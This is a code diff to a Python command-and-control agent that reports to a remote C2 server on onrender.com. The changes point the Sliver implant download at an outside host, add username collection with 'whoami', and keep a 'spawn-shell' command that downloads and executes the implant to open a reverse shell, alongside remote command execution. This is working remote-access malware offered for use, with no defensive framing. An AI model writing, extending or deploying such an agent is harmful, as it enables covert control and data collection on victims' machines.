@@ -10,16 +10,22 @@ import netifaces
 
 # Server settings
 SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL
-SLIVER_URL = "sliver_implant"  # URL to download the implant
+SLIVER_URL = "https://sliver-host.onrender.com/sliver_implant"  # New Render URL
 
 def get_system_info():
-    """Gather system information."""
+    """Gather system information including username."""
     info = {
         "hostname": platform.node(),
         "os": platform.system(),
         "os_version": platform.release(),
         "architecture": platform.machine(),
     }
+    try:
+        username = subprocess.run("whoami", shell=True, capture_output=True, text=True).stdout.strip()
+        info["username"] = username
+    except Exception as e:
+        print(f"[!] Error getting username: {e}")
+        info["username"] = "unknown"
     return info
 
 def get_network_info():
@@ -57,6 +63,10 @@ def execute_command(command):
         if command.strip().lower() == "spawn-shell":
             # Trigger the Sliver reverse shell by downloading and executing the implant
             return download_and_execute_sliver()
+        elif command.strip().lower() == "whoami":
+            # Handle whoami command
+            result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
+            return result.stdout + result.stderr
         elif command.strip().lower().startswith("cd "):
             # Extract directory from 'cd' command
             target_dir = command.strip().split("cd ", 1)[1].strip()
